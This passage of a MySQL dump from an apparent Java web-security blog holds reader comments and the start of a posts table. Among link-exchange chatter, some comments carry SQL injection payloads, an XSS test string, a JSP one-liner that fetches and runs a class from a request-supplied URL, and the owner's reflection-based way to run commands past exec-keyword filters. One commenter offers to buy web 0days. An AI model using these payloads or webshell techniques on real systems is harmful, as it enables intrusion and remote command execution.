10:10:19', '0', null), ('13976', '122', '1', '园长MM', 'ok', '1', '2015-04-20 10:34:48', '13891', null), ('13217', '1665', '0', 'john', 'SELECT * FROM blocks WHERE locId &gt; 0 ORDER BY locId LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)\n<p>[SQL] SELECT * FROM blocks WHERE locId &gt; 0 ORDER BY locId LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>\n<p>[Err] 1105 - XPATH syntax error: \':0\'</p>', '1', '2015-01-27 13:36:31', '0', null), ('13960', '122', '0', '独孤小生', '已添加贵站链接。 名称：独孤小生 链接：www.dugu-niche.com', '1', '2015-04-18 17:03:53', '0', null), ('13426', '1672', '0', '刘帅', '哇哦，听从园长‘妹纸’的建议，学习了一段时间的PHP了，再来看园长的文章还是感觉好高大上看不懂。。我。。我继续滚去学习了。。', '1', '2015-02-16 09:11:15', '0', null), ('13739', '122', '1', '园长MM', 'admin@javaweb.org', '1', '2015-03-25 20:51:52', '13738', null), ('13738', '122', '0', 'Tommy', '园长，有问题请教。可否Email。', '1', '2015-03-25 17:24:31', '0', null), ('13612', '1300', '0', '陈航冰', '表哥http://xxx.com:9200/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%2 利用代码 命令应该插哪里呢？', '1', '2015-03-16 02:09:59', '0', null), ('13625', '1683', '1', '园长MM', '新版支持\n<p>http://dev.mysql.com/doc/refman/5.6/en/date-and-time-literals.html#date-and-time-standard-sql-literals</p>\n<p>http://dev.mysql.com/doc/refman/5.6/en/join.html#idm140714470997024</p>', '1', '2015-03-16 21:04:12', '13623', null), ('13472', '122', '0', 'xss&gt;', 'xss&gt;&lt;&quot;/000000', '1', '2015-02-23 22:38:32', '0', null), ('13617', '1300', '1', '园长MM', '用hackbar POST提交', '1', '2015-03-16 11:37:24', '13612', null), ('13623', '1683', '0', 'liuyu', 'select{x table_name}from{x information_schema.tables}\n<p>请问，这个｛ 在mysql怎么用？查了半天mysql手册也没查到。</p>', '1', '2015-03-16 19:50:24', '0', null), ('13277', '122', '0', '轩猫', '网址：http://www.xema.sitezj.net\n<p>名称：轩猫博客</p>\n<p>描述：轩猫博客，分享技术文章，丰富网络生活</p>\n<p>我站已经做好贵站连接，请审核！</p>\n<p>友链一下把，保证不怀孕！</p>', '1', '2015-02-01 19:30:20', '0', null), ('13041', '1643', '0', 'testcc', '能整理下吗？看起来好乱', '1', '2015-01-19 06:14:59', '0', null), ('13988', '122', '1', '园长MM', '咋帮?做啥？', '1', '2015-04-22 11:01:34', '13983', null), ('13993', '122', '0', '天空', '方便加一下QQ吗？ 我的邮箱。详谈', '1', '2015-04-22 17:35:08', '13988', null), ('13982', '1512', '0', 'init5', '哥，都过好些天了', '1', '2015-04-21 14:47:25', '11647', null), ('13057', '1643', '1', '园长MM', '用notepad++之类的文本编辑器打开', '1', '2015-01-19 22:24:59', '13041', null), ('13562', '1690', '0', 'Ends', '也写了几个POC请园长MM指教http://ends.cc/?p=750', '1', '2015-03-05 12:30:45', '0', null), ('13563', '1690', '1', '园长MM', '你的博客内容非常不错哦，赞', '1', '2015-03-05 17:35:42', '13562', null), ('13581', '122', '0', 'sco4x0', '园长叔叔抱一个，还有，换个友链好不咯\n<p>http://www.sco4x0.com/ sco4x0\'s Blog</p>', '1', '2015-03-08 19:30:14', '0', null), ('13891', '122', '0', '忆学安全网', '园长大人，来个友联，谢谢  http://www.yxaqw.com', '1', '2015-04-10 01:38:58', '0', null), ('13630', '1300', '0', '陈航冰', '园长表哥你QQ多少我想和你详谈一下！', '1', '2015-03-17 08:54:53', '13617', null), ('13334', '122', '0', '沉香', '来个友链，贵站链接已做好   沉香s\' Blog  http://sec.org.cn', '1', '2015-02-07 13:55:54', '0', null), ('14563', '1766', '1', '园长MM', '批量插入，每次导入1W很快就可以插入了。', '1', '2015-08-21 02:01:34', '14562', null), ('14565', '1766', '0', 'test', '你是说value的值同时插入1W么？我觉是不是python读取文本的速度限制了插入的速度~~\n<p>我现在转mongodb了，如果好用就用mongodb了</p>', '1', '2015-08-21 07:28:48', '14563', null), ('14619', '122', '1', '园长MM', '好了', '1', '2015-09-08 23:04:39', '14616', null), ('13798', '1237', '0', 'Java访问https网页时证书', '[&#8230;] 最后，我参考了这里，http://javaweb.org/?p=1237解决了我的问题。 [&#8230;]', '1', '2015-03-30 18:32:58', '0', null), ('13311', '122', '0', '轩猫', '网站名称：轩猫博客\n<p>网站地址：www.xema.fu0.net</p>\n<p>网站描述：轩猫博客，发唠叨、吐槽，分享技术文章、冷段子，探索网络安全的小博客</p>\n<p>对不起，原来的博客挂了，所以改成这个，希望把原来的改成www.xema.fu0.net，谢谢！</p>', '1', '2015-02-05 20:28:32', '0', null), ('13308', '122', '0', '探路者', 'www.toreadsafe.xyz 探路者博客   已经添加贵站！', '1', '2015-02-05 10:55:48', '0', null), ('14135', '122', '0', 'lostwolf', '想加你qq讨论个小小的问题', '1', '2015-05-24 00:18:59', '13993', null), ('13286', '122', '0', '轩猫', '网址：http://xema.zz.mu\n<p>名称：轩猫博客</p>\n<p>描述：轩猫博客，分享技术文章，丰富网络生活</p>\n<p>我站已经做好贵站连接，请审核！</p>\n<p>友链一下把，保证不怀孕！</p>\n<p>注：请把原来的http://www.xema.sitezj.net删除！谢谢</p>', '1', '2015-02-02 14:08:19', '0', null), ('13285', '1665', '0', 'ddatsh', 'SELECT id FROM xxx WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); \n<p>[Err] 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'extractvalue(rand(),concat(0x3a,version())),1)\' at line 1</p>\n<p>5.6.22</p>', '1', '2015-02-02 12:20:44', '0', null), ('14616', '122', '0', '0xreg', '园长，来个友链~~\n<p>名称：灵查注册</p>\n<p>网址：http://www.0xreg.com</p>', '1', '2015-09-08 00:56:25', '0', null), ('14359', '122', '0', 'cnsolu', '换个链接呗，园长大大 http://idsolu.com  \n<p>已加上你的</p>', '1', '2015-07-16 11:53:52', '0', null), ('14458', '229', '0', 'nul', '那岂不是放个jsp的马儿，就看不到了正确的页面返回了么？菜刀估计也不行了?', '1', '2015-08-03 14:35:00', '0', null), ('14562', '1766', '0', 'test', '请问一下园长大大，这么大的数据怎么导入mysql比较好，我用python脚本将你的json格式转换为insert语句插入，一个晚上之插入了2000W而已，表示不能忍受！用的是INSERT DELAYED INTO 并且同时插入的是两个值居然还那么慢，请问怎么破~~', '1', '2015-08-20 19:24:00', '0', null), ('14657', '1827', '0', 'Ends', '写过一个类似绕过防篡改的东东，把webshell编程ascii码上传，然后用读写文件的方式还原webshell，再通过base64编码交互搞定', '1', '2015-09-27 22:27:17', '0', null), ('14627', '820', '0', '大龄菜b', '园长MM，问一下这个漏洞j是不是jboss 6以及更高版本都不能利用吧', '1', '2015-09-14 23:02:24', '0', null), ('14736', '1812', '0', 'cmdaaa', '园长，写程序吗？我这里想写个爬虫程序，带数据库 CMS识别。', '1', '2015-10-19 00:11:01', '0', null), ('14637', '1450', '0', '王路', 'jos.write(IOUtils.toString(in,\"UTF-8\").replace(\"host\", \"hehe\").getBytes(\"UTF-8\"));\n<p>这个可以放多个配置进行替换吗，大神？</p>', '1', '2015-09-17 23:18:14', '0', null), ('14606', '1812', '1', '园长MM', '你猜呢？', '1', '2015-09-03 08:25:34', '14604', null), ('14603', '1619', '0', '张三', 'java.sql.sqlException : 连接串格式错误，或缺少连接信息', '1', '2015-09-02 18:43:33', '0', null), ('14604', '1812', '0', '乐乐', '大表哥 这是干嘛用的', '1', '2015-09-02 21:22:40', '0', null), ('14639', '122', '0', 'Scorpio', '吾爱漏洞   www.52bug.cn   谢谢 贵站已友链！', '1', '2015-09-19 00:12:41', '0', null), ('14640', '122', '0', 'Scorpio', '贵站已友链   谢谢   \n<p>吾爱漏洞   www.52bug.cn</p>', '1', '2015-09-19 00:41:09', '0', null), ('14643', '820', '1', '园长MM', '6测试的时候可以，以上肯定不行。', '1', '2015-09-20 05:19:40', '14627', null), ('14644', '1450', '1', '园长MM', '你可以修改这段替换代码，做成配置文件也挺简单的吧。', '1', '2015-09-20 05:20:34', '14637', null), ('14646', '122', '1', '园长MM', '好的，加好了~', '1', '2015-09-20 05:21:50', '14640', null), ('14788', '1766', '0', 'mrcheng', '你好，看到你的域名数量达到亿级别，是怎样做到的？', '1', '2015-11-04 04:36:20', '0', null), ('14726', '626', '0', '[zone]BurpSuite ', '[&#8230;] prefix（前缀）或add suffix（后缀） 插件： 1.BurpSuite代码格式化插件：BurpSuiteJSBeautifier&#8211; @园长 贡献 2.burpsuite集成sqlmap插件&#8211; @小乐天 贡献 [&#8230;]', '1', '2015-10-16 18:49:05', '0', null), ('14916', '1822', '1', '园长MM', '已经没有用云服务了,不喜欢一直被监控的感觉~', '1', '2015-12-08 07:18:47', '14913', null), ('14913', '1822', '0', 'imlonghao', '云盾的话，windows 的服务器也有类似软件的，官方有bat提供卸载。', '1', '2015-12-08 02:58:53', '0', null), ('14840', '1766', '1', '园长MM', '到处收集的.', '1', '2015-11-26 05:31:06', '14788', null), ('16368', '1797', '0', 'heiben', '你好，想请问一下能否发一份到我的邮箱，或者更新一下百度云盘的地址吗？我现在在研究类似的指纹识别工作，实在太有用了。万分感谢园长MM。', '1', '2016-06-01 20:16:18', '0', null), ('16833', '122', '0', 'HackBraid', '园长表哥，来个友链啊\n<p>名称:Braid’s Blog</p>\n<p>网址:http://www.cnbraid.com</p>', '1', '2016-10-10 17:34:12', '0', null), ('15387', '122', '1', '园长MM', 'ok', '1', '2016-03-03 16:15:13', '15364', null), ('15425', '122', '0', 'T0n9', '名称:T0n9\'s Blog\n<p>网址:http://www.t0n9.com</p>\n<p>描述:PHP与安全！</p>\n<p>类型:技术类型博客</p>', '1', '2016-03-06 13:47:26', '0', null), ('15429', '122', '1', '园长MM', 'ok', '1', '2016-03-07 16:33:42', '15425', null), ('16371', '1797', '1', '园长MM', '百度云链接就在文章最后面', '1', '2016-06-01 21:16:13', '16368', null), ('15467', '122', '0', 'LittleHann', 'littlehann.cnblogs.com\n<p>友链已添加</p>', '1', '2016-03-14 10:49:31', '0', null), ('16237', '122', '0', 'Xman', '名称:Xman\'s Blog\n<p>网址:http://www.xmanblog.net/</p>\n<p>类型:技术类型博客。</p>', '1', '2016-05-24 21:33:13', '16236', null), ('15355', '1733', '0', 'Sai', '求园长分享一份国内的活跃IP fuzzing表', '1', '2016-02-29 15:07:55', '0', null), ('15364', '122', '0', 'T0reAd', '探路者博客 改一下 换域名了 改为 www.hksafe.cn.com T0reAd安全博客', '1', '2016-03-01 11:16:13', '0', null), ('16236', '122', '0', 'Xman', '来个友链吧~~', '1', '2016-05-24 21:31:16', '0', null), ('16828', '122', '0', 'any3ite', '园长大人，换个链接咯。。\n<p>any3ite\'s Blog  http://www.any3ite.com</p>', '1', '2016-10-10 09:13:49', '0', null), ('16660', '1797', '0', '小屿', '下了份、', '1', '2016-09-22 23:52:25', '0', null), ('16966', '122', '0', 'any3ite', '友链已经添加。\n<p>名称  any3ite‘s Blog</p>\n<p>网站  http://www.any3ite.com</p>', '1', '2016-10-18 15:14:40', '0', null), ('17003', '122', '1', '园长MM', '加上了~', '1', '2016-10-22 10:11:24', '16966', null), ('17004', '122', '1', '园长MM', '加上了', '1', '2016-10-22 10:11:34', '16833', null), ('17015', '1835', '0', '测试', '测试', '1', '2016-12-20 02:21:25', '0', null), ('17016', '1842', '0', '喵', '( ^_^ )不错~', '1', '2016-12-21 18:44:42', '0', null), ('17019', '1853', '0', '虾米', '好久没过来了，今天过来看了一眼，结果没发现我的友情链接，改版了居然还把我的友情链接给删除了，哼，生气。伦家要用小拳拳锤你的胸胸。', '1', '2017-02-09 12:45:04', '0', '0'), ('17020', '1853', '1', 'yzmm', '最近把WORDPRESS换掉后的确清理了很多打不开的网站,重新发下地址就可以了。', '1', '2017-02-13 07:02:54', '0', '0'), ('17025', '122', '0', 'Jevy', '用hello world和你打个招呼，会不会让你觉得特亲切', '1', '2017-02-27 04:31:41', '0', '0'), ('17023', '1851', '0', 'zxc', '连接无效啦啦啦 求补~', '1', '2017-02-22 17:52:28', '0', '0'), ('17024', '1851', '1', 'yzmm', '留下你的原URL地址', '1', '2017-02-25 12:26:33', '0', '0'), ('17026', '122', '1', 'yzmm', 'Hello.\\nWorld.', '1', '2017-02-27 07:25:44', '0', '0'), ('17027', '1854', '0', 'yzmm', '捅园长皮炎', '1', '2017-03-09 16:08:09', '0', '0'), ('17028', '1698', '0', 'david', '网盘链接无效下，可否把这个域名库分享给我呢？ 我的邮/箱:  mengdu子@163.com  ，把 子 字改成拼音。谢谢了!', '1', '2017-03-17 18:29:47', '0', '0'), ('17029', '1698', '1', 'yzmm', 'baidu网盘的所有数据都已经删了，没有了。', '1', '2017-03-18 16:51:10', '0', '0'), ('17030', '1855', '0', 'shenjingb', '对于没有使用@type注解的应该没关系吧', '1', '2017-03-19 16:13:11', '0', '0'), ('17031', '1855', '1', 'yzmm', '@shenjingb C/S交互的时候经常会直接传输json对象，所以这个时候可能是某个端直接序列化了对方传过来的json字符串。所以这里的@type并不一定是参数中获取的某个具体key值，比方说@type=123，不是这意思可能是如参数json对应的值是{&quot;@type&quot;:&quot;xxxx&quot;}。 ', '1', '2017-03-19 20:12:25', '0', '0'), ('17032', '1855', '0', '过客', 'http://webcache.googleusercontent.com/search?q=cache:GRBlR5_GdlYJ:blog.nsfocus.net/analysis-protection-fastjson-remote-code-execution-vulnerability/&amp;num=1&amp;newwindow=1&amp;hl=zh-CN&amp;gl=cn&amp;strip=0&amp;vwsrc=0\r\n\r\n这是绿盟分析的一个快照。和你的思路略有不同，你看看有什么借鉴的没有。\r\n\r\n通过新老版本的代码对比，发现此漏洞出现在com\\alibaba\\fastjson\\parser\\DefaultJSONParser.java文件中的DefaultJSONParser::parseObject函数，如下图所示：\r\n\r\n\r\n\r\n从图中可以看到，在1.2.24 （即受影响的版本）版本的代码中，加载类名时，用到了一个TypeUtils::loadClass的方法，此方法在com\\alibaba\\fastjson\\util\\TypeUtils.java中的具体内容如下：\r\n\r\n\r\n\r\n\r\n', '1', '2017-03-22 12:18:52', '0', '0'), ('17035', '1797', '0', 'BDIU', '能否重新发下链接，原来的链接失效了', '1', '2017-03-29 12:23:36', '0', '0'), ('17036', '1668', '0', '落英剪', '这个倒是不用备份，每次下载的war包中，都包含了doc，doc中就有这些', '1', '2017-03-29 12:32:02', '0', '0'), ('17042', '122', '0', '文雨', '貌似没有找到rss的链接啊', '1', '2017-04-11 06:45:09', '0', '0'), ('17038', '1842', '0', '落英剪', '大神，可否得到你的邮箱', '1', '2017-03-29 12:34:12', '0', '0'), ('17039', '122', '0', 'MiluSen', '换个友链吧！\r\n名称：python培训\r\n网站：http://www.lessoncode.com/', '1', '2017-03-30 07:13:45', '0', '0'), ('17040', '1797', '1', 'yzmm', '下载地址更新了，自己下吧。', '1', '2017-03-30 09:25:52', '0', '0'), ('17041', '1842', '1', 'yzmm', '@落英剪 干嘛', '1', '2017-03-30 09:26:36', '0', '0'), ('17043', '1797', '0', 'ltdzzzz', '园长这个是扒下来的吗？现在fofa.so是不是已经找不到这些数据了，求指点', '1', '2017-05-18 15:40:15', '0', '0'), ('17044', '1797', '0', 'yzmm', '这个只是特征库，算不上指纹库。采集的fofa以前公开的数据。', '1', '2017-05-19 22:38:12', '0', '0'), ('17046', '1851', '0', '奋斗的小鸟', '链接失效了。能发一份吗', '1', '2017-05-26 10:40:18', '0', '0'), ('17047', '1851', '0', '奋斗的小鸟', '邮箱：861768278@qq.com 谢谢', '1', '2017-05-26 10:40:57', '0', '0'), ('17048', '1851', '1', 'yzmm', '已补链接', '1', '2017-05-30 17:45:09', '0', '0'), ('17049', '1797', '0', 'missingnight', '园长MM，更新链接里面的数据库不全呀~缺失太多~我现在也在研究类似的指纹识别工作，能否分享一份完整些的~万分感谢~', '1', '2017-06-04 22:19:09', '0', '0'), ('17050', '1797', '1', 'yzmm', '@missingnight 当时的数据本就只有这么多', '1', '2017-06-05 01:25:59', '0', '0'), ('17051', '1797', '0', 'missingnight', '就图片上显示出的那些表项也没有呢', '1', '2017-06-05 09:27:44', '0', '0'), ('17052', '1797', '1', 'yzmm', '新建数据库，导入Mysql就可以了。', '1', '2017-06-05 12:41:14', '0', '0'), ('17053', '1797', '0', 'missingnight', '哦哦~原来是我的Mysql-Front显示问题，默认把多行显示成&lt;MEMO&gt;了~所以看不到那几行的信息~麻烦园长MM了~感谢~', '1', '2017-06-05 16:23:10', '0', '0'), ('17054', '122', '0', '杰森黑客博客', '博主你好 互换友情链接不www.hackjason.com', '1', '2017-06-09 10:48:07', '0', '0'), ('17055', '122', '1', 'yzmm', '@杰森黑客博客 你加上后留言', '1', '2017-06-09 11:14:57', '0', '0'), ('17056', '1856', '0', '小哥哥', '关注博文已久，不知大牛手上有无web 0day，我愿以惊喜价收入。', '1', '2017-06-09 12:36:42', '0', '0'), ('17057', '122', '0', '杰森黑客博客', '博主，你好  互换友情链接吗！www.hackjason.com', '1', '2017-06-14 20:22:50', '0', '0'), ('17058', '1856', '0', 'zll', '换连接吗：\r\nwww.xz-src.com', '1', '2017-06-16 15:25:23', '0', '0'), ('17059', '122', '0', '啪啪啪啪', '啪啪啪啪', '1', '2017-06-29 08:01:38', '0', '0'), ('17060', '122', '0', '林辰博客', 'linchen.org.cn友链', '1', '2017-07-28 04:07:31', '0', '0'), ('17061', '1548', '0', 'sammie', '百度盘连接失效了，可以更新一下吗', '1', '2017-07-28 07:12:59', '0', '0'), ('17062', '1548', '1', 'yzmm', '更新了下载地址', '1', '2017-08-01 10:19:57', '0', '0'), ('17063', '122', '1', 'yzmm', '@林辰博客 你的主页没有，请先添加再回帖', '1', '2017-08-01 10:22:58', '0', '0'), ('17064', '122', '0', '林辰', '园长妹妹来个友链啦!\r\nlinchen.org.cn', '1', '2017-08-07 02:04:48', '0', '0'), ('17075', '122', '0', '林辰', '我去，有毒  网络不好多点了几次', '1', '2017-08-07 02:22:29', '0', '0'), ('17076', '122', '0', 'hello', '园长mm，给个友链吧', '1', '2017-09-07 06:53:46', '0', '0'), ('17077', '122', '1', 'yzmm', '添加本站链接后留言', '1', '2017-09-08 05:36:52', '0', '0'), ('17078', '122', '0', '素材火', '博主是美女啊？', '1', '2017-09-13 03:24:18', '0', '0'), ('17079', '1858', '0', 'Proxifier ', 'Proxifier  用了很久了。', '1', '2017-11-07 06:34:56', '0', '0'), ('17080', '1856', '0', '奶牛君', '请问大牛，生成注释时出现乱码如何解决现将new String(col.getComment().getBytes(&quot;UTF-8&quot;), &quot;GBK&quot;)处理后仍有部分中文注释出现乱码情况，项目是UTF-8编码的idea设置的默认编码也是utf-8', '1', '2017-11-22 00:45:21', '0', '0'), ('17081', '1856', '1', 'yzmm', '@奶牛君 你用的是Windows？可能是脚本写文件的时候没指定编码或者数据库编码不一致导致的。', '1', '2017-11-22 09:38:09', '0', '0'), ('17082', '1858', '0', '胖', '表弟，过来表哥抱抱。', '1', '2017-12-05 02:44:07', '0', '0'), ('17083', '1858', '0', '但丁', '大表哥是不是换qq号码了~', '1', '2017-12-06 05:09:39', '0', '0'), ('17084', '1858', '0', '虾米', '好久没过来了，今天过来想和博主说一下呀，我的博客更换域名了。\r\n请更换一下我博客的友情连接地址呦。  原来的域名 gdd.gd   新域名   coao.co   谢谢啦。', '1', '2017-12-07 01:46:32', '0', '0'), ('17085', '1858', '1', 'yzmm', '@但丁 早就换号了，没办法。', '1', '2017-12-11 05:42:09', '0', '0'), ('17086', '1856', '0', 'Hran', '非常感谢，很好用~\r\n在Win上使用有两处需要修改：\r\n1. getPackageName方法中在dir.toString()后面加上.replaceAll(&quot;\\\\\\\\&quot;, &quot;.&quot;)\r\n2. 在IDEA安装目录的bin目录下，修改idea[64].exe.vmoptions，添加-Dfile.encoding=utf8就可以解决中文乱码问题了', '1', '2017-12-15 03:21:57', '0', '0'), ('17087', '122', '0', '1998', '名称：1998&#039;s Blog\r\n链接：https://1998.kim/index.php/links.html\r\n来个友情链接 园长MM，由于博客主题所限，所有链接暂放友链页面~', '1', '2017-12-17 12:44:36', '0', '0'), ('17090', '122', '0', '春熙路', '第一次进来看看、好简洁的界面', '1', '2017-12-27 13:19:04', '0', '0'), ('17091', '1859', '0', '虾米', '好久没来了。一切安好。', '1', '2018-01-03 02:29:12', '0', '0'), ('17089', '1856', '0', 'sky', 'win出现问题还未解决的，请换电脑吧，mac毫无毛病', '1', '2017-12-21 03:22:20', '0', '0'), ('17092', '1858', '0', '鳄鱼皮具', '没苹果电脑，可以收藏', '1', '2018-01-27 09:49:45', '0', '0'), ('17093', '1858', '0', 'Glieen', '我就试试能不能回复', '1', '2018-01-29 07:58:28', '0', '0'), ('17094', '1860', '0', 'siddim', '谢谢分享。收下了', '1', '2018-02-06 03:58:18', '0', '0'), ('17095', '1858', '0', 'Jumbo', '他这个相比proxychains4有个问题，比如用Proxifier Mac代理（代理方式是利用reGeorg进行代理的）后nmap进行扫描某主机，不加sudo扫描什么端口都是开着的，加了sudo扫描什么端口都是关着的,很奇怪', '1', '2018-02-12 10:37:06', '0', '0'), ('17096', '1858', '1', 'yzmm', '@Jumbo 我没试过代理后用nmap扫描，感觉可能是优先级的问题？', '1', '2018-02-22 03:22:50', '0', '0'), ('17097', '1861', '0', 'Sealin', '蒂花之秀', '1', '2018-03-28 03:26:39', '0', '0'), ('17098', '567', '0', 'newfish', '百度云网盘地址失效了,能在分享一下吗?', '1', '2018-04-07 06:30:56', '0', '0'), ('17099', '567', '1', 'yzmm', '@newfish 已更新下载地址.', '1', '2018-04-10 09:14:55', '0', '0'), ('17100', '1862', '0', 'moonfish', '哈哈哈实现了一个RASP', '1', '2018-04-19 09:02:57', '0', '0'), ('17101', '1862', '1', 'yzmm', '@moonfish 机智～', '1', '2018-04-24 02:18:42', '0', '0'), ('17102', '1627', '0', 'nbnous', '&lt;%=Class.forName(&quot;Load&quot;,true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter(&quot;u&quot;))})).getMethods()[0].invoke(null, new Object[]{request.getParameterMap()})%&gt;\r\n这段代码和cat.jar根本配不上呀？9K和4k我找到两个版本都不行。', '1', '2018-04-28 05:18:13', '0', '0'), ('17103', '1627', '1', 'yzmm', '@nbnous 下载地址 http://javaweb.org/uploads/file/20180428/20180428062255_142.jar', '1', '2018-04-28 06:25:13', '0', '0'), ('17104', '1627', '0', 'exec', '请问exec 这些函数被杀有什么能替换吗？unicode编码也不行。', '1', '2018-04-28 12:19:21', '0', '0'), ('17105', '1627', '0', '小呆', '本篇文章cat.jar与反射cat.jar好像有很大区别，能不能把两个jar合并，但是合并后两段jsp改怎么写？', '1', '2018-04-30 04:04:45', '0', '0'), ('17106', '1627', '1', 'yzmm', '绕过exec关键字很简单，如果是纯代码检测用这个无任何命令执行关键字的命令执行jspx(参数str):\n<a href=\"http://javaweb.org/uploads/file/20180502/20180502014842_62.zip\"><font color=\'red\'>cmd.jspx.zip</font></a>\n\n如果是语言层拦截了exec，那么可以通过反射java.lang.UNIXProcess类实现执行任意的命令。示例代码如下:<pre class=\"brush: java; gutter: true\">\nClass clazz = Class.forName(\"java.lang.ProcessImpl\");\nConstructor constructor = clazz.getDeclaredConstructors()[0];\nconstructor.setAccessible(true);\n\nProcess process = (Process) constructor.newInstance(\n		toCString(cmdarray[0]), argBlock, args.length, \n		null, envc[0], null, std_fds, false\n);\n</pre>\n\n如果不会写，自己参考\"UNIXProcess.java\"的代码就可以了。\n', '1', '2018-05-02 01:51:31', '0', '0'), ('17109', '1863', '0', '虾米', '朋友 我的博客地址更新了 关键词：蜗居 URL地址： https://woj.app 望朋友看到更新一下呦。感谢。 好久没来了，路过踩一脚。', '1', '2018-05-14 09:47:24', '0', '0'), ('17108', '1863', '0', 'a', '为什么需要把类型转为Byte再去转类型名称呢,直接写类型名称会有什么问题么?', '1', '2018-05-11 07:31:49', '0', '0'), ('17111', '1863', '1', 'yzmm', '用byte的原因是怕有人写的检测代码是直接提取的关键字，比如他的规则是提取一个jsp文件中如果包含Runtime关键字就直接拦截。', '1', '2018-05-15 03:12:43', '0', '0'), ('17112', '1148', '0', 'RSocks', '你好！我代表一家做VPN和ip地址的公司。想在你的网址发布广告或帖子，有没有这样的机会？', '1', '2019-03-21 23:12:33', '0', '0'), ('17114', '1672', '0', 'c', '师傅如何把获得的ip传入dnslog呢', '1', '2019-04-11 21:23:44', '0', '0'), ('17121', '1872', '0', '搬瓦工', '学习了', '1', '2019-06-26 14:41:07', '0', '0'), ('17125', '1874', '0', 'xy', '666', '0', '2019-09-17 09:30:17', '0', '0'), ('17129', '1874', '1', 'guest', '<script>alert(/test/);</script>', '0', '2019-09-17 13:56:49', '0', null);
COMMIT;

-- ----------------------------
--  Table structure for `sys_posts`
-- ----------------------------
DROP TABLE IF EXISTS `sys_posts`;
CREATE TABLE `sys_posts` (
  `post_id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '文章ID',
  `user_id` int(9) NOT NULL COMMENT '用户ID',
  `category_id` int(11) NOT NULL DEFAULT '-1',
  `post_title` varchar(100) NOT NULL COMMENT '标题',
  `post_author` varchar(16) NOT NULL COMMENT '作者',
  `post_content` longtext NOT NULL COMMENT '文章内容',
  `post_password` varchar(32) DEFAULT NULL COMMENT '访问密码',
  `publish_date` datetime NOT NULL COMMENT '发布时间',
  `publish_status` smallint(1) NOT NULL DEFAULT '1' COMMENT '发布状态(1:已发布,2:草稿),默认值:1',
  `post_clicks` int(11) unsigned zerofill NOT NULL DEFAULT '00000000000' COMMENT '点击数',
  `tags` varchar(255) DEFAULT NULL COMMENT '标签',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论数量',
  `last_modified_time` datetime NOT NULL COMMENT '最后修改时间',
  PRIMARY KEY (`post_id`),
  KEY `index_title` (`post_title`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=1875 DEFAULT CHARSET=utf8 COMMENT='文档表';

-- ----------------------------
--  Records of `sys_posts`
-- ----------------------------
BEGIN;
INSERT INTO `sys_posts` VALUES ('6', '1', '3', 'Java URLClassLoader动态加载jar包', '园长', '<p>\n<p>	Jdk1.2开始有一个URLClassLoader类加载器。该类加载器用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源。这里假定任何以 &lsquo;/&rsquo; 结束的 URL 都是指向目录的。如果不是以该字符结束，则认为该 URL 指向一个将根据需要打开的 JAR 文件</p></p>\n<br />\n<br />\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\npackage com.javaweb.user.test;\nimport java.io.File;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\npublic class UrlTest {\n    public static void main(String[] args) {\n        try {\n            URL url = new File(&quot;c:/Url.jar&quot;).toURI().toURL();\n            URLClassLoader ucl = new URLClassLoader(new URL[]{url});\n            Class&lt;?&gt; c = Class.forName(&quot;org.javaweb.url.Url&quot;,true,ucl);\n            Method[] m = c.getDeclaredMethods();\n            for(Method method:m ){\n                method.setAccessible(true);\n                if(&quot;test&quot;.equals(method.getName())){\n                    method.invoke(ucl, new Object[]{});\n                }\n                System.out.println(method.getName());\n            }\n        } catch (MalformedURLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (IllegalArgumentException e) {\n            e.printStackTrace();\n        } catch (InvocationTargetException e) {\n            e.printStackTrace();\n        }\n    }\n}\n</pre>\n<p><div></p>\n<p>	Url.jar内容：<br /></p>\n	<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\npackage org.javaweb.url;\npublic class Url {\n    public static void test(){\n        System.out.println(&quot;I&#39;m void.&quot;);\n    }\n}\n</pre>\n<p></div></p>\n<p><div></p>\n<p>	&nbsp;</div></p>\n<p><div></p>\n<p>	输出内容：<br /></p>\n	<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nI&#39;m void.\ntest\n</pre>\n<p></div></p>', null, '2013-11-28 16:02:19', '1', '544', null, '0', '2013-11-28 16:59:44'), ('12', '5', '3', 'Java 加载资源文件问题', 'Anonymous', 'From:<a href=\"http://blog.csdn.net/funi16/article/details/8137708\">http://blog.csdn.net/funi16/article/details/8137708</a>\n<p>JAVA里面对于类进行调用配置资源的文件数据，以this.getClass().getResourceAsStream()来读取比较合适。</p>\n<p>路径采用相对路径直接可以从工程的path路径去找。</p>\n<p>主要问题是如果类中采用的是静态块的话，则该this.getClass()报错，因为读静态块时，可能该对象并为构造，所以用this来指向当前对象不行。</p>\n<p>ClassLoader提供了两个方法用于从装载的类路径中取得资源：</p>\n<p>public URL getResource(String name);</p>\n<p>public InputStream getResourceAsStream(String 